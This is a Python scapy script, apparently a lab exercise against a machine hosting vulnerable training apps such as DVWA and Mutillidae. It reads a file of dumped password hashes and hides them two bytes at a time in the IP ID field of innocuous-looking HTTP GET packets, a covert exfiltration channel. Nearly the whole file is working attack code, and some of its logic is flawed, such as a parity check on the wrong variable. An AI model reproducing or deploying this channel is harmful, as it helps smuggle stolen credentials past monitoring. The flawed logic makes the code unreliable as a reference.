from os import popen
from struct import unpack
from scapy.all import *
from scapy.layers import http


#sending syn and receiving syn/ack
ip_header = IP()
ip_header.dst = "192.168.136.132"
ip_header.display()

tcp_header = TCP()
tcp_header.dport = 80
tcp_header.flags = "S"
tcp_header.display()

TCP_SYNACK = sr1(ip_header/tcp_header)


tcp_header.flags = "A"
tcp_header.seq = TCP_SYNACK.ack
tcp_header.ack = TCP_SYNACK.seq + 1
#print(TCP_SYNACK.ack)
#print(TCP_SYNACK.seq+1)
send(ip_header/tcp_header)

payload = 'GET / HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n'

#payload = "GET / HTTP/1.0\r\nHOST: 192.168.56.107\r\n\r\n"

reply, error = sr(ip_header/tcp_header/payload, multi=1, timeout=1)
for r in reply:
    r[0].show2()
    r[1].show2()


#ipid payload
#payload_ipid = 'GET /dvwa/login.php HTTP/1.1\r\n'
payload_ipid = []
payload_ipid.append('GET /dvwa/login.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /mutillidae/index.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /ghost/index.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /WackoPicko/index.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /WackoPicko/pictures/recent.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /diws.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /Hackademic_Challenges/index.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /Hackademic_Challenges/about.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /vicnum/index.html HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')
payload_ipid.append('GET /WackoPicko/guestbook.php HTTP/1.1\r\nHost: 192.168.136.132\r\n\r\n')

print payload_ipid

#opening a file containing hashes
with open('hash_dump.txt') as f:
	s=f.read()
j = 0
count = 0
covert_payload = s
print(covert_payload)
print(len(covert_payload))

limit = 0
if len(payload)%2 == 0:
	limit = len(covert_payload)/2
	print(limit)
else:
	payload += "\x00" * 3 
	limit = len(covert_payload)/2 
	print(limit)

#tcp_header.seq = 100
#tcp_header.ack = 200
#myseq = 1000
#myack = 2000
#myseq = tcp_header.ack
#myack = tcp_header.seq + 1
myseq = TCP_SYNACK.ack
myack = TCP_SYNACK.seq+1
print(TCP_SYNACK.ack)
print(TCP_SYNACK.seq+1)
print(myseq)
print(myack)

for i in range(0,limit):
	id_payload = covert_payload[count:count+2]
	count = count + 2
	id1 = unpack("<H",id_payload)[0]
	#ip_header.id = id1
	#tcp_header.
	my_payload = payload_ipid[j]
	#my_pkt = ip_header/tcp_header/my_payload
	my_pkt = IP(dst = "192.168.136.132", id = id1)/ TCP(dport = 80, seq = myseq, ack = myack)/ my_payload
	print(my_pkt.show())
	pkt = send(my_pkt)
	#tcp_header.seq = pkt.ack
	#tcp_header.ack = pkt.seq + 1
	myseq = my_pkt.ack
	myack = my_pkt.seq + 1
	j = j + 1
	if(j==len(payload_ipid)):
		j=0
	#send(pkt)
	print(id_payload)
